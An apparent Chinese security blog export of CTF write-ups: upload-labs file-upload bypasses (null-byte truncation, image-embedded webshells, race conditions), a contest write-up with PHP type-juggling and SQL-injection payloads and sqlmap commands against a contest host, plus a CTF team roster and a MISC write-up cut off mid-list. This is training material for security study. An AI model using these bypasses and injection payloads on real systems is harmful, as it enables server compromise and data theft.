返回字符串的子串 说明 ¶ string substr ( string $string , int $start [, int $length ] ) 返回字符串 string 由 start 和 length 参数指定的子字符串。 pass%00截断 原理： 截断的核心，就是chr(0)这个字符 先说一下这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！ 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生 0x00，%00，/00之类 的也是一样的 https://www.cnblogs.com/milantgh/p/3612978.html https://www.cnblogs.com/hack0ne/p/4603144.html Pass-121234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = "上传失败"; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; %00截断 Pass-131234567891011121314151617181920212223242526272829303132333435363738394041function getReailFileType($filename)&#123; $file = fopen($filename, "rb"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").".".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = "上传失败"; &#125; &#125;&#125; 010editor 打开一个png，在png最后加上一句话木马 绕过文件头检查，添加GIF图片的文件头GIF89a，绕过GIF图片检查。 Pass-141234567891011121314151617181920212223242526272829303132function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = "上传失败"; &#125; &#125;&#125; getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。 image_type_to_extension — 取得图像类型的文件后缀 pass010editor 打开一个png，在png最后加上一句话木马 绕过文件头检查，添加GIF图片的文件头GIF89a，绕过GIF图片检查。 Pass-15123456789101112131415161718192021222324252627282930313233343536function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return "gif"; break; case IMAGETYPE_JPEG: return "jpg"; break; case IMAGETYPE_PNG: return "png"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = $UPLOAD_ADDR."/".rand(10, 99).date("YmdHis").".".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = "上传失败"; &#125; &#125;&#125; exif_imagetype — 判断一个图像的类型 pass010editor 打开一个png，在png最后加上一句话木马 绕过文件头检查，添加GIF图片的文件头GIF89a，绕过GIF图片检查。 Pass-16原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 pass010editor 打开一个png，在png最后加上一句话木马 绕过文件头检查，添加GIF图片的文件头GIF89a，绕过GIF图片检查。 Pass-171234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,".")+1); $upload_file = $UPLOAD_ADDR . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = $UPLOAD_ADDR . '/'. rand(10, 99).date("YmdHis").".".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传失败！'; &#125;&#125; pass利用条件竞争删除文件时间差绕过。 文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传 Pass-18利用上传重命名竞争+Apache解析漏洞，成功绕过。 上传名字为18.php.7Z的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。 然后利用Apache的解析漏洞，即可获得shell Pass-19123456789101112131415161718192021222324$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists($UPLOAD_ADDR)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $img_path = $UPLOAD_ADDR . '/' .$file_name; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传失败！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR . '文件夹不存在,请手工创建！'; &#125;&#125; pathinfo — 返回文件路径的信息(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7) pathinfo() 函数以数组的形式返回关于文件路径的信息。 返回的数组元素如下： [dirname] [basename] [extension] 语法 pathinfo(path,options) 参数 描述 path 必需。规定要检查的路径。 options 可选。规定要返回的数组元素。默认是 all。可能的值：PATHINFO_DIRNAME - 只返回 dirnamePATHINFO_BASENAME - 只返回 basenamePATHINFO_EXTENSION - 只返回 extension pass大小写绕过 save_name修改为caidao19.php.即可 参考writeup： https://fuping.site/2018/06/04/upload-labs-writeup/ https://github.com/LandGrey/upload-labs-writeup 当php邂逅windows通用上传缺陷 https://blog.csdn.net/qq_33020901/article/details/78952684]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018安恒五月月赛WriteUp]]></title>
    <url>%2F2018%2F05%2F22%2F2018%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E6%9C%88%E8%B5%9BWriteUp%2F</url>
    <content type="text"><![CDATA[WEB奇怪的恐龙特性 大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。 1234567891011121314151617181920&lt;?php highlight_file(__FILE__); ini_set("display_error", false); error_reporting(0); $str = isset($_GET['A_A'])?$_GET['A_A']:'A_A'; if (strpos($_SERVER['QUERY_STRING'], "A_A") !==false) &#123; echo 'A_A,have fun'; &#125; elseif ($str&lt;9999999999) &#123; echo 'A_A,too small'; &#125; elseif ((string)$str&gt;0) &#123; echo 'A_A,too big'; &#125; else&#123; echo file_get_contents('flag.php'); &#125; ?&gt; A_A,too small 分析一下 1$str = isset($_GET['A_A'])?$_GET['A_A']:'A_A'; 如果有get参数A_A，就把A_A的值赋给$str 123if (strpos($_SERVER['QUERY_STRING'], "A_A") !==false) &#123; echo 'A_A,have fun'; &#125; strpos() 函数查找字符串在另一字符串中第一次出现的位置。 $_SERVER[“QUERY_STRING”]获取查询语句，实例中可知，获取的是?后面的值 例如http://101.71.29.5:10007/?A_A=1 $_SERVER[“QUERY_STRING”]的值是：A_A=1 那么怎么绕过这个strpos并且把$str赋值呢？ 我们来了解一下下面这个php特性 php自身在解析请求的时候，如果参数名字中包含” “、”.”、”[“这几个字符，会将他们转换成下划线。 那么假设我发送的是这样一个请求： /t.php?user_id=11111&amp;user.id=22222 ，php先将user.id转换成user_id，即为/t.php?user_id=11111&amp;user_id=22222 ，再获取到的$_REQUEST[&#39;user_id&#39;]就是22222。 那么这里绕过可以用A.A,A+A(这道题测试+也是可以绕过) PHP获取当前url路径的函数及服务器变量:QUERY_STRING、REQUEST_URI、SCRIPT https://bugs.leavesongs.com/php/%E8%B4%B7%E9%BD%90%E4%B9%90%E7%B3%BB%E7%BB%9F%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%EF%BC%88%E6%97%A0%E9%9C%80%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87waf%E5%8F%AFunion-select%E8%B7%A8%E8%A1%A8%E6%9F%A5%E8%AF%A2%EF%BC%89/ 12345678910elseif ($str&lt;9999999999) &#123; echo 'A_A,too small'; &#125; elseif ((string)$str&gt;0) &#123; echo 'A_A,too big'; &#125; else&#123; echo file_get_contents('flag.php'); &#125; 然后这里判断 $str不能小于9999999999， (string)$str不能大于0 贴一下xsser直播讲解的例子，我们可以看到 []&gt;9999999是真，[]&gt;-1也是真，反过来就是[]&lt;999999为假 自己再测试一下 123var_dump([]&lt;999999);var_dump((string)[]);var_dump((string)[]&gt;0) 结果为 123boolean falsestring &apos;Array&apos; (length=5)boolean false 我们可以看到 (string)[]，php会把数组经过string转换后变为 值为Array的string类型 因为当字符串和数字比较时，php会把字符串转换为int类型，如果字符串开头是字符，就转换为0 这样就绕过了elseif ((string)$str&gt;0) 不理解的话再放xsser的两张ppt 最后总结一下： 用 A.A绕过if (strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;A_A&quot;) !==false) 用数组绕过 ($str&lt;9999999999) 和 ((string)$str&gt;0) playload http://101.71.29.5:10007/?A+A[]=1 查看源代码即可看到flag flag={09bc24026c987ae44a6e424479b2e3} PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题 不能注册的admin 你敢注册一个“admin”账户吗？敢吗？你试试？ 查看源代码发现有一段js代码 1234567891011121314151617&lt;script&gt;id = $("#uid").val();$(document).ready(function()&#123; $("#uid").blur(function()&#123; if(id !== ""|| !id)&#123; $.ajax(&#123; url:"json.php",type:'post',data:&#123;'id':id&#125;,success:function(d)&#123; var data = eval('(' +d +')'); if(data['id'] !='undefined' ||data['id'] !="" ||data['id']!=null)&#123; alert('用户名已存在!'); &#125; &#125; &#125;) &#125; &#125;)&#125;)&lt;/script&gt; 分析一波，这段代码就是把id参数post给json.php 尝试一波注入，发现不行 查看一下网络，发现响应头写着(Win32)，那可能是windows服务器 想到windows大小写不敏感 1、在window系统中，所有的文件夹或者文件名是不区分大小写的。即在同一个目录下不能同时存在名称相同大小写不一样的文件夹或者文件。 2、在压缩文件中是可以同时存在如上所述的文件的。例如：文件夹a 和 文件夹A 以及test.txt和TEST.txt是可以同时存在同一目录下的。 补充学习： https://www.bbsmax.com/A/Ae5R4bnNzQ/的Rotten Uploader 实验发现，在Windows系统中， &lt; 符号可以代替扩展名的一部分，如果没有扩展名（没有 . ）就可以代替全部。 例如此目录下有 index.php 123456789101112131415161718192021D:\www\test&gt;type &quot;index&lt;&quot;系统找不到指定的文件。 D:\www\test&gt;type &quot;index&lt;&quot;系统找不到指定的文件。 D:\www\test&gt;type &quot;index.&lt;&quot;&lt;?phpreadfile(&apos;./FL&lt;&apos;); D:\www\test&gt;type &quot;index.p&lt;&quot;&lt;?phpreadfile(&apos;./FL&lt;&apos;); D:\www\test&gt;type &quot;index.php&lt;&quot;&lt;?phpreadfile(&apos;./FL&lt;&apos;); D:\www\test&gt;type &quot;index.php&lt;&lt;&lt;&quot;&lt;?phpreadfile(&apos;./FL&lt;&apos;); 于是把php改为phP，就可以注入了 先上sqlmap 获取数据库 1sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --dbs -p id --thread 10 拿到当前数据库 1sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db 获得表 1sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb --tables 拿到表里面的内容 1sqlmap -u http://101.71.29.5:10006/json.phP?id=admin --flush -p id --thread 10 --current-db -D 5monthweb -T article --dump 尝试手动注入一波 单引号没反应 双引号报错了 1Fatal error: Uncaught exception &apos;Exception&apos; with message &apos;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;&apos; at line 1 query: select * from article where title =&quot;admin&quot; &quot;&apos; in E:\apache2\htdocs\MysqliDb.php:1926 Stack trace: #0 E:\apache2\htdocs\MysqliDb.php(516): MysqliDb-&gt;_prepareQuery() #1 E:\apache2\htdocs\MysqliDb.php(550): MysqliDb-&gt;rawQuery(&apos;select * from a...&apos;, NULL) #2 E:\apache2\htdocs\json.php(39): MysqliDb-&gt;rawQueryOne(&apos;select * from a...&apos;) #3 &#123;main&#125; thrown in E:\apache2\htdocs\MysqliDb.php on line 1926 发现这一句，要用双引号闭合 select * from article where title =”admin” “‘ in order by 判断一下，4的时候错误，那就说明表有三列 id=admin” order by 3%23 把admin随便换一个，这样前面没有数据就会把union select的值输出，这里发现把1和2输出 id=-“ union select 1,2,3%23 获得数据库 5monthweb id=-“ union select user(),database(),3%23 获得表名 article id=-“ union select user(),table_name,3 from information_schema.tables where table_schema = database()%23 获得列名 id,title,content id=-“ union select user(),group_concat(column_name),3 from information_schema.columns where table_schema = database()%23 得表里面的数据 id=-“ union select user(),concat_ws(char(32,58,32),id,title,content),3 from 5monthweb.article %23 flag{you_are_admin} 附上安恒杯月赛讲解视频链接 直播地址：http://study.163.com/course/courseMain.htm?courseId=1004945010&amp;share=2&amp;shareId=400000000254024 解题讲师：你们最最熟悉的xsser老师 MISCwifi密码是多少 你猜猜 咱们的wifi密码是多少？ 你懂操作系统吗 哈哈哈哈 文件：5afea37acccbc.bin flag{Y0ung_m4n_u_are_s0_coo1!}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSP学习笔记]]></title>
    <url>%2F2018%2F05%2F20%2FCSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[阮一峰：Content Security Policy 入门教程 Content Security Policy 通过浏览器缓存来bypass CSP script nonce 梅子酒： 使用 Wave 文件绕过 CSP 策略]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国内外杰出的CTF战队（持续更新）]]></title>
    <url>%2F2018%2F05%2F20%2F%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F%2F</url>
    <content type="text"><![CDATA[因为觉得自己和同学只是会打打CTF，对国际和国内一些Team不是很了解，特地开了这篇博客,本文的资料均来自下方链接，目前主要内容来自 公众号：腾讯安全联合实验室;) ，XCTF社区 https://mp.weixin.qq.com/s/QdwpnVdz4fV0qJKTgoMO9w https://mp.weixin.qq.com/s/Fp7Ja_nzIHy84yeWRi6l0Q https://www.leiphone.com/news/201706/9KnCeQQXC1vrHVrt.html 蓝莲花战队蓝莲花（Blue-Lotus）战队是一支源自清华大学的网络安全技术竞赛和研究团队，是中国参与CTF（Capture The Flag）网络安全技术竞赛成绩最为突出的一支国际知名战队。 2013年成为华人世界历史上首支成功闯入DEFCON黑客大会 CTF全球总决赛[1] 的队伍，并获得安全宝冠名赞助。2014年连续第二次入围DEFCON CTF全球总决赛，并获得第五名的优秀战绩。2014年蓝莲花战队成功组织BCTF“百度杯”全国网络安全技术对抗赛，成为当时全国参与规模最大的CTF赛事，并在2014至2015年开始发起并总体组织XCTF全国网络安全技术对抗联赛。 AAA战队： AAA战队是由浙江大学信息安全爱好者自发组织、浙江大学计算机学院支持建立的团队，在CTF圈颇有名气，曾获2016年ZCTF冠军、TCTF 2017新人邀请赛冠军、WHCTF 2017冠军、以及2017年高校网络信息安全管理运维挑战赛全国总冠军；并于2017年与腾讯、上海交通大学、复旦大学组成腾讯A0E联合战队参加DEF CON CTF 2017全球总决赛，在全球十数支顶级战队中斩获季军。在TCTF 2018的线上预赛阶段，AAA战队在也取得了第一名。 毫无疑问，他们是本年度TCTF夺冠的热门战队。 Redbud战队：专注实力提升 Redbud战队由来自清华大学学生网络安全技术协会的信息安全爱好者组成。Redbud，意为”紫荆”，战队的宗旨是不为名次和奖励，只为锻炼和提升个人的技术水平，加强和CTF优秀选手的交流与互动，并为国内知名战队——蓝莲花战队（Blue-Lotus）培养后备力量。 该战队的成绩从去年第四届XCTF联赛线上赛以来一直保持着高位，最近更是迎来了全面的爆发，在本届TCTF 线上预赛以第二名的成绩挺进决赛。 emmmm战队：看队名看不透实力 emmmm战队是由哈尔滨工业大学、北京邮电大学和中国科学技术大学组成的联合战队，战队名字颇为俏皮，但备赛经验丰富，在本届TCTF线上预赛中位列高校战队前三。 emmmm战队表示，要在TCTF 2018线下决赛取得突破性成绩，努力摘得桂冠。 Vidar战队：“As we do, as you know” Vidar战队来自杭州电子科技大学，是浙江高校中最早建立的白帽黑客团队，由杭电信息安全协会（原HDUISA）和网络空间安全学院合并而成。团队前身 HDUISA 是杭州电子科技大学信息安全协会。Vidar战队中聚集了一批又一批对信息技术感兴趣的同学，互相交流学习信息安全领域的知识及技术。同时为了检测自己的水平，以国内外的各种相关比赛为载体与各大高校乃至列强劲旅一较高下，至今已成功举办九届HCTF比赛。 该战队认为，编程技术可谓一日千里，新漏洞层出不穷，CTF题目的脑洞越开越大，实践能力是关键。As we do, as you know。 kap0k战队：迅速崛起的新生力量 ​ kap0k 团队是一支源自华南理工大学的网络安全技术竞赛和研究团队，成立于 2017 年三月。 kap0k 名字源自木棉树，为华南理工大学校树，寓意着团队成员对技术的不懈追求和对黑客自由精神的坚守。建队以来，秉持着以技术让网络更安全的理念，kap0k 的成员在校园网安全建设、CTF 竞赛、安全大数据竞赛等安全的诸多方面都有所建树。kap0k 是实力正在迅速增强的新生CTF战队， 曾在第四届XCTF联赛揭幕战武汉站WHCTF线上赛取得第八名的好成绩。 MxM战队： 网络安全与执法并重 ​ MxM来自浙江警察学院，是警校的优良作风建设下迅速崛起的新生力量，实力演绎警校学生对信息安全领域的不停追求与探索。该战队表示，通过参加专业CTF赛事，加强自身网络安全法制实践能力，是提高网络警察专业的人员执法能力和效率的保障。 Lancet战队：做网络世界的手术刀 Lancet源自于北京航空航天大学的网络安全技术竞赛和研究团队，战队成立于2015年10月，获得过2016年信息安全与对抗技术竞赛分组对抗赛全国一等奖、“安恒杯”全国高校网络安全技能竞赛第一名、“美亚柏科”大学生网络空间安全精英邀请赛第一名等多个奖项。2017 年在GMIC-XCTF京津冀邀请赛稳居冠军宝座；第四届XCTF联赛揭幕战武汉站WHCTF线上赛排名第三，网络安全经验丰富，实力不凡。 Lancet战队表示，要做网络世界的手术刀，既要撕裂网络世界的表面看到安全隐患，也要为网络安全主刀消除隐患。 kn0ck战队：“To be or not to be” kn0ck战队于2018上半年成立，是多个高校组合联盟战队，由国内信息安全专业实力雄厚的高校学生组成。战队成员因兴趣与热爱而聚集，以不服输的精神全力向着梦想进发。 作为一支新兴的CTF队伍，战队的宗旨是通过实际比赛将理论知识更好的发挥，以赛代练，锻炼和提升个人的技术水平，在比赛中广交朋友，共同进步。今年，该战队在赛博地球杯工业互联网安全大赛线上初赛榜单上位居前十。 Ph0t1n1a战队：以赛代练，提高实战能力 Ph0t1n1a是来自上海交通大学一支新兴的极客力量。其队名源于上海交通大学校花——石楠花（photinia）英文单词的变形。 Ph0t1n1a战队的宗旨是：以赛代练，在比赛中提高自己的实战能力。 CNSS战队：“Stay hacking, stay exploring” CNSS战队，来自由电子科技大学信息安全爱好者自发组织的一个研究网络安全的技术团队——凝聚工作室，是电子科大古老工作室文化的代表；开放、包容，有着对技术的独特理解。该战队曾在世界顶级黑客大会Hack in the box(HITB)的CTF线上赛中，取得全球第17名的好成绩。 CNSS战队认为，凝聚工作室存在的价值和意义是一种校园创新文化的营造，一届又一届地传递一种挑战的精神和文化。 Blue-Whale战队：培养信息安全兴趣是初衷 Blue-Whale来自中国海洋大学，2012年依托于中国海洋大学信息安全实验室而成立。团队以中国海洋大学信息安全实验室为基础，专注于信息安全领域研究，研究方向包括系统安全、渗透测试、密码学等。自成立之初，Blue-Whale团队始终以培养信息安全兴趣，研究与分享信息安全知识与技术为目标。历经两年发展后，Blue-Whale战队开始活跃于国内外各类CTF比赛中。在2013-2014年山东省大学生信息安全知识竞赛中包揽团队和个人冠军，在2016年全国大学生信息安全大赛中获得二等奖。 WaterDrop：“方寸之间，深不见底” WaterDrop，来自中山大学的一支新兴战队，第一代组建于2017年初。战队名WaterDrop取自科幻小说《三体》中提到的由强相互作用力材料（SIM）所制成的宇宙探测器，寄寓着我们的目标。因为其形状与水滴相似所以被人类称之为水滴，会反射几乎100%的电磁波，完全由被强相互作用力紧密锁死的质子与中子构成，无坚不摧，“方寸之间，深不见底”。 NeSE战队：Never Stop Exploiting NeSE成立于2015年，主要成员都来自中国科学院信息工程研究所，战队全称为“Never Stop Exploiting”， 象征着永不停止钻研的极客精神。NeSE战队一直以来都希望通过参加高层次的CTF竞赛，提高实践能力，累积互联网攻防经验。战队成绩也十分突出，曾获得TCTF 2017预赛第六、决赛第十，AliCTF 2016国内第一，第十届全国大学生信息安全竞赛线上赛第一名等成绩。 在本届TCTF预赛阶段，NeSE战队以十二名的成绩出线，成为决赛夺冠竞争者。 Dragon Sector战队：波兰劲旅 Dragon Sector战队是一支来自波兰的战队，隶属于Google安全团队，成立于2013年2月。Dragon Sector战队目前有16名活跃队员，经常参加线上线下安全竞赛。这支队伍非常擅长“逆向”领域的试题，整体解题思路非常特殊，经常出人意料。尤其在比赛中后劲十足，往往成为CTF比赛的焦点，他们在比赛中的解题思路也经常被波兰当地杂志刊登。 在CTFTIME梳理的近五年全球CTF战队评级中，Dragon Sector都位列前十，2018年的实力评级为第五，是一支名副其实的劲旅。 lotus-r3kapig战队: “给我一朵蓝莲花，我能撬起一飞猪” lotus-r3kapig战队是由国内蓝莲花、Eur3kA和flappypig三支战队组建的联合战队，自称是“究极完全体阿基米德莲花猪”，在TCTF 2018国际赛预赛中位列第三。该战队的口号是：“给我一朵蓝莲花，我能撬起一飞猪”。 Cykor战队：冠军专业户 Cykor战队由韩国大学生信息安全研究俱乐部组成，成立于2011年。他们在第二届XCTF国际联赛总决赛中荣获冠军；在TrendMicro CTF、Codegate 2017 prequals以及SECCON 2016 Final competition等诸多大赛中都曾摘得桂冠。最令人印象深刻的是，CyKor成员参与的DEFKOR战队在2015年DEF CON世界顶级黑客大赛中上演绝地反击、力压PPP战队的精彩一战使他们成为首个赢得DEF CON CTF冠军的韩国黑客团队，也正是因为这场比赛让他们一战成名。 而这对于Cykor战队来说并不是终点，战队成员一致认为，参加这么多CTF比赛，就是为了追赶世界顶级极客的步伐。 曾因韩国神童Lokihardt的加入，获得趋势亚太CTF、HITCON CTF 2015和HDCON CTF 2015的冠军，在Belluminar 2016夺得亚军，在Codegate 2017 prequals 和SECCON 2016 决赛中获得冠军。 PwnThyBytes战队：主要是回馈社会 PwnThyBytes战队是来自罗马尼亚的队伍，成立于2015年，有着非常丰富的大赛经验，曾参加过Codegate CTF 2014、2017，TCTF 2017，HITCON CTF 2016，SECCON 2015，Trend Micro 2016 、2017。该战队表示，多次参加比赛除了获得优秀的成绩之外，更主要的是为回馈社会。 在TCTF 2018，他们将全力以赴，展示战队的安全技术和挑战能力，并取得好成绩。 ******战队：无限的可能性 战队由复旦大学在校生和已毕业的各领域专家共同组成，队名六颗星星代指六个通配符，意为无限的可能性。自2014年成立以来，战队在很多比赛中取得了优异的成绩，曾获XCTF 2014成都分站赛第三，ACTF 2015冠军，SSCTF 2016线上赛第七，0CTF 2016决赛第八。 2017年7月，战队还和腾讯eee战队、上海交大0ops战队、浙大AAA战队组成腾讯A0E联合战队，参加世界顶级黑客大会DEF CON，位列前三。 专访*CTF出题战队六星队员杨森：老牌战队新的征程LC↯ BC战队: 战斗民族心怀宇宙 LC↯ BC战队来自俄罗斯，战队命名颇为玄妙，灵感来源于地球的一部分构成方式。曾在2015年获得EKOPARTY CTF，PHD CTF Finals，CONFidence CTF及Belluminar Seoul等国际CTF比赛的冠军。LCBC战队还曾主办了QIWI CTF 2014和Olympic CTF 2014等比赛。战队位列CTFTIME全球排行榜2017年度全球第六、2016年度全球第四。 !SpamAndHex战队：多瑙河畔的传统强队 !SpamAndHex战队来自匈牙利布达佩斯技术经济大学的CrySyS实验室,曾获得多项国际CTF比赛冠军，例如2017WCTF世界黑客大师赛第十三名，在CTFTIME 2014年的评级中位列前二十。 Nu1L战队：国内冠军拿到手软 Nu1L战队成员来自于上海科技大学、西华大学、成都信息工程大学、北京理工大学等全国多所高校，最早是由两个研究Web的同学创建，队名源于计算机中语言中经常出现的“NULL”。Nu1L战队的小伙伴们都对信息安全以及CTF比赛有着浓厚的兴趣，他们在过去的比赛中战绩辉煌，曾获SCTF 2016冠军、LCTF 2016冠军、第一届百度杯信息攻防总决赛冠军、NJCTF 2017冠军、BCTF 2017冠军、LCTF 2017冠军、TCTF 2017新人邀请赛亚军、第三届XCTF总决赛季军，同时主办了N1CTF 2018，是冲击本届TCTF冠军的有力竞争者。 TokyoWesterns战队：来自东京的极客 TokyoWesterns战队成员均在东京西部生活或是上学，战队名称因此得来；曾获得日本SEC CON等国际赛事冠军，CTFTIME全球排行榜2017年度全球第五位，目前排名也在全球前十位。同时，作为赛事主办方，TokyoWesterns战队也可圈可点，已连续举办三届Tokyo Westerns CTF。 ROIS战队： 把兴趣做到极致 ROIS战队是由福州大学数学与计算机科学、软件工程学院的同学组成的团队，得到了网络系统信息安全福建省高校重点实验室老师的指导。团队分为核心小组和兴趣小组，旨在为对信息安全有兴趣的同学提供技术交流和学习平台，主要参加各类CTF比赛以及为校园网络做安全测试。ROIS战队曾在首届XCTF联赛上海站决赛中获得第四名，并在最终总决赛中获得季军，在CTFTIME 2016年度的排名中位列第八十六。 Shellphish战队: 看到漏洞威胁就像普通人看到颜色一样 Shellphish是来自美国的战队，战队成员遍布美国、法国、中国、巴西和塞内加尔等国，规模庞大，曾获得TCTF 2017国际赛的冠军。Shellphish战队的部分成员还参加了美国国防部高级研究计划局（DARPA）主办的Cyber Grand 挑战赛的决赛，并从中获得了75万美元的奖金，在CTFTIME 2017年度的排名中位列第9，2015年位列第4。他们对极客技术有着近乎疯狂的痴迷，自称“看到漏洞威胁就像普通人看到颜色一样”。 217来自中国宝岛台湾，台湾大学的战队，CTFTIME全球排名2016年第6，在国内国际赛场战果丰硕，曾获首届XCTF联赛总决赛冠军，在国际重量级赛事Plaid CTF及SECCON CTF中也均取得过第一名的好成绩。 403 Forbidden同样也是来自宝岛台湾的战队，是台湾著名战队HITCON的成员，HITCON曾获得2016年DEF CON CTF第4名，2017年Boston Key Party CTF冠军。403 Forbidden以本次在TCTF国际赛中的成绩，暂居CTFTIME全球排名第97。]]></content>
      <tags>
        <tag>CTF Team</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-MISCWriteUp]]></title>
    <url>%2F2018%2F05%2F20%2FBugku-MISCWriteUp%2F</url>
    <content type="text"><![CDATA[本来AFCTF2018校赛前刷了一半了，然后搞校赛了，然后才这个周末刷完。 待会还有安恒杯月赛，手有点酸，哈哈。 这是一张单纯的图片下载下来用UE打开，发现最后有下面的字符，很明显是Unicode编码，解码一下拿到flag，注意手动加一下} 1&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125 flag key{you are right} 隐写解压有个PNG图片，修改一下图片大小，再打开图片发现flag 用UE打开图片，第二行的 0-3 4-7 表示图片的宽高 flag BUGKU{a1e5aSA} telnetkey格式flag{xxxxxxxxxxxxxxxxxxxxxxxxxxx} 是个pcap文件，发现有很多telnet协议，追踪TCP流发现flag flag flag{d316759c281bf925d600be698a4973d5} 眼见非实(ISCCCTF) JPEG (jpg)， 文件头：FFD8FF 文件尾：FF D9 PNG (png)， 文件头：89504E47 文件尾：AE 42 60 82GIF (gif)， 文件头：47494638 文件尾：00 3BZIP Archive (zip)， 文件头：504B0304 文件尾：50 4BTIFF (tif)， 文件头：49492A00 Windows Bitmap (bmp) 文件头：424D CAD (dwg)， 文件头：41433130 Adobe Photoshop (psd) 文件头：38425053 Rich Text Format (rtf)， 